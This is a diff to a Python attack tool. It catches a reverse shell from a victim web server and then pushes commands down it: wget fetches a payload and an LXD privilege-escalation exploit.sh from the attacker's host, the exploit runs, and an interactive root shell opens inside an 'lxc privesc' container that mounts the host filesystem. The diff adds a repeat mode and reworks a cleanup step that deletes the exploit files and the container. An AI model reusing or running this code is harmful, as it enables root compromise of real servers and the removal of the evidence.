@@ -17,7 +17,7 @@ class color:
 	UNDERLINE = '\033[4;37;48m'
 	END = '\033[1;37;0m'
 
-def listen(ip,port, t2, r_port, file_name, general_info, arguments, rep):
+def listen(ip,port, t2, r_port, file_name, general_info, arguments, rep, k):
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.bind((ip, port))
 	s.listen(1)
@@ -48,13 +48,17 @@ def listen(ip,port, t2, r_port, file_name, general_info, arguments, rep):
 			
 		commands = ['''cd $(grep -e DocumentRoot -R /etc/apache2/sites-enabled/ | awk '{ print $3 }')
 ''','wget -O {r_port}_file.tar.gz {ip}:{r_port}/{file_name}\n'.format(ip = ip, r_port = r_port, file_name = file_name), 
-		'wget -O exploit.sh {ip}:{r_port}/Privilege_Escalation_LXD/exploit.sh\n'.format(ip = ip, r_port = r_port), 'chmod 755 ./exploit.sh\n', './exploit.sh -f {r_port}_file.tar.gz\n'.format(r_port = r_port),'whoami && pwd\n'] 
-		for cmd in commands:
-			ans = recvall(conn)
-			sys.stdout.write(ans)
-			conn.send(cmd.encode())
-			time.sleep(0.2)
-			
+		'wget -O exploit.sh {ip}:{r_port}/Privilege_Escalation_LXD/exploit.sh\n'.format(ip = ip, r_port = r_port), 'chmod 755 ./exploit.sh\n', './exploit.sh -f {r_port}_file.tar.gz\n'.format(r_port = r_port),'whoami && pwd\n', 'lxc start privesc\n'] 
+		if arguments.repeat == None or ( arguments.repeat != None and rep == k-1):
+			for cmd in commands:
+				ans = recvall(conn)
+				sys.stdout.write(ans)
+				conn.send(cmd.encode())
+				time.sleep(0.2)
+		else:
+			print(color.GREEN + '[*]' + color.END + ' Skipping lxc container creation')
+			# Give server time to process request
+			time.sleep(1)
 		# Dont print Banner if on repeat mode
 		if arguments.repeat == None:
 			print(color.CYAN + '''
@@ -79,14 +83,12 @@ def listen(ip,port, t2, r_port, file_name, general_info, arguments, rep):
 		# If on repeat mode, just execute some commands and exit
 		# otherwise allow the user to mess around with terminal
 		if arguments.repeat == None:
+			print('Starting Interactive mode')
 			while True:
 				#Receive data from the target and get user input
-				print("", flush=True, end="")
-				conn.settimeout(1)
 				ans = recvall(conn)
-				conn.settimeout(None)
-				sys.stdout.write(color.BOLD + ans + color.END)
-				print("", flush=True, end="")
+				print(color.BOLD + ans + color.END, end=" ", flush=True)
+				
 				command = input()
 
 				# Send command with 'lxc exec privesc -- sh -c "cd /mnt/root"', in order to execute the command inside the container
@@ -99,9 +101,7 @@ def listen(ip,port, t2, r_port, file_name, general_info, arguments, rep):
 				
 				command += '\n'
 				conn.send(command.encode())
-				time.sleep(0.4)
-				print(ans.split("\n")[-1])
-				print("", flush=True)
+				time.sleep(0.1)
 			print('[DEBBUG] Exiting While')
 		else:
 			# Do some random commands while root on the lxc container
@@ -115,7 +115,6 @@ def listen(ip,port, t2, r_port, file_name, general_info, arguments, rep):
 			print(color.YELLOW + '\n[-]' + color.END + ' Unbinding...')
 			# Cleanup
 			
-			cleanup(conn, file_name, general_info, rep)
 			time.sleep(0.2)
 			s.close()
 			print(color.GREEN + '[*]' + color.END + ' Ended exploit')
@@ -129,15 +128,20 @@ def listen(ip,port, t2, r_port, file_name, general_info, arguments, rep):
 			time.sleep(0.2)
 			conn.close()
 			s.close()
-	finally:
-		print(color.GREEN + '[*]' + color.END + ' Closing...')
+			if rep == 0:
+				os._exit(0)
+	
+	print(color.GREEN + '[*]' + color.END + ' Closing...')
+	if conn:
+		cleanup(conn, file_name, general_info, rep)
 		conn.close()
-		# Not recommended to use this function, however even with sys.exit() the system hangs
-		if rep == 0:
-			os._exit(0)
+		s.close()
+	# Not recommended to use this function, however even with sys.exit() the system hangs
+	if rep == 0:
+		os._exit(0)
 		
         
-def listen_shell(ip, port, v_ip, v_port, general_info, arguments, secure, rep):
+def listen_shell(ip, port, v_ip, v_port, general_info, arguments, secure, rep, k):
 	r_port = random.randint(1024, 65536)
 	# Making sure the random port is not in use
 	while check_port(ip, r_port):
@@ -151,7 +155,7 @@ def listen_shell(ip, port, v_ip, v_port, general_info, arguments, secure, rep):
 	t1 = threading.Thread(target=task, args=(v_ip, v_port, s))
 	t2 = threading.Thread(target=task2, args=(ip, r_port))
 	t1.start()
-	listen(ip, int(port), t2, r_port, get_file_name(), general_info, arguments, rep)
+	listen(ip, int(port), t2, r_port, get_file_name(), general_info, arguments, rep, k)
 	
 def task(v_ip, v_port, s=''):
 
@@ -225,10 +229,11 @@ def recvall(sock):
             break
     return data
 
+# IF IN REPEAT MODE DONT DELETE LXC AND REUSE IT
 
 def cleanup(conn, file_name, general_info, rep):
 	script_dir = os.path.dirname(os.path.realpath(__file__))
-	conn.send('''cd $(grep -e DocumentRoot -R /etc/apache2/sites-enabled/ | awk '{ print $3 }') && rm -f *.tar.gz exploit.sh; lxc stop privesc && lxc delete privesc && lxc image delete alpine;\n'''.encode())
+	cmd = '''cd $(grep -e DocumentRoot -R /etc/apache2/sites-enabled/ | awk '{ print $3 }') && rm -f *.tar.gz exploit.sh;\n'''
 	
 	# Only delete local files if it's the last repetition
 	# That way we avoid downloading k times the required software
@@ -240,8 +245,9 @@ def cleanup(conn, file_name, general_info, rep):
 			os.remove(script_dir + '/../' + file_name)
 		if os.path.exists(script_dir + '/../' + 'build-alpine'):
 			os.remove(script_dir + '/../' + 'build-alpine')
+		cmd = '''cd $(grep -e DocumentRoot -R /etc/apache2/sites-enabled/ | awk '{ print $3 }') && rm -f *.tar.gz exploit.sh; lxc stop privesc && lxc delete privesc && lxc image delete alpine;\n'''
 
-
+	conn.send(cmd.encode())
 	if general_info['active'] == 'True':
 		try:
 			requests.get('http://'+ informAudittingStop(general_info), timeout=(1,1))
